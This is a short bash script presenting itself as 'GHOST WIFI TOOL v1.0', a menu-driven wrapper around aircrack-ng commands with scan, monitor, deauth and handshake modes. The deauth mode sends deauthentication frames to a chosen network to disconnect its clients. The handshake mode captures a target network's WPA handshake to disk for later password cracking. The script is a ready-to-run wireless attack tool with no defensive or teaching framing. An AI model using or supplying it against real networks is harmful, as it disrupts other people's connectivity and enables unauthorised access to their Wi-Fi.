#!/bin/bash

MODE="scan"
INTERFACE=""
TARGET=""
CHANNEL=""

while [[ $# -gt 0 ]]; do
    case $1 in
        -m|--mode) MODE="$2"; shift 2 ;;
        -i|--interface) INTERFACE="$2"; shift 2 ;;
        -t|--target) TARGET="$2"; shift 2 ;;
        -c|--channel) CHANNEL="$2"; shift 2 ;;
        -h|--help)
            echo "Usage: $0 [options]"
            echo ""
            echo "Options:"
            echo "  -m, --mode <mode>       scan|monitor|deauth|handshake"
            echo "  -i, --interface <iface> Network interface"
            echo "  -t, --target <bssid>   Target BSSID"
            echo "  -c, --channel <num>    Channel number"
            echo "  -h, --help            Show this help"
            exit 0 ;;
        *) shift ;;
    esac
done

[ -z "$INTERFACE" ] && INTERFACE=$(iwconfig 2>/dev/null | grep -o "^[a-zA-Z0-9]*" | head -1)

echo "======================================"
echo "   GHOST WIFI TOOL v1.0               "
echo "======================================"
echo ""

case $MODE in
    scan)
        echo "[*] Scanning for WiFi networks..."
        if command -v airmon-ng &> /dev/null; then
            sudo airmon-ng start "$INTERFACE" 2>/dev/null
            sudo airodump-ng "${INTERFACE}mon" 2>/dev/null || sudo airodump-ng "$INTERFACE"
        elif command -v iwlist &> /dev/null; then
            sudo iwlist "$INTERFACE" scan
        elif command -v nmcli &> /dev/null; then
            nmcli device wifi list
        else
            echo "[!] No WiFi tools found"
        fi
        ;;
    monitor)
        echo "[*] Enabling monitor mode..."
        sudo ip link set "$INTERFACE" down
        sudo iw dev "$INTERFACE" set type monitor
        sudo ip link set "$INTERFACE" up
        echo "[+] Monitor mode enabled on $INTERFACE"
        ;;
    deauth)
        [ -z "$TARGET" ] && { echo "[!] Target BSSID required"; exit 1; }
        echo "[*] Sending deauth to $TARGET..."
        if command -v aireplay-ng &> /dev/null; then
            sudo aireplay-ng --deauth 10 -a "$TARGET" "${INTERFACE}mon"
        else
            echo "[!] airmon-ng not found"
        fi
        ;;
    handshake)
        [ -z "$TARGET" ] && { echo "[!] Target BSSID required"; exit 1; }
        echo "[*] Capturing handshake from $TARGET..."
        if command -v airodump-ng &> /dev/null; then
            mkdir -p ~/ghost_toolkit/scans
            sudo airodump-ng -c "${CHANNEL:-1}" -w ~/ghost_toolkit/scans/capture --bssid "$TARGET" "${INTERFACE}mon"
        else
            echo "[!] airmon-ng not found"
        fi
        ;;
esac
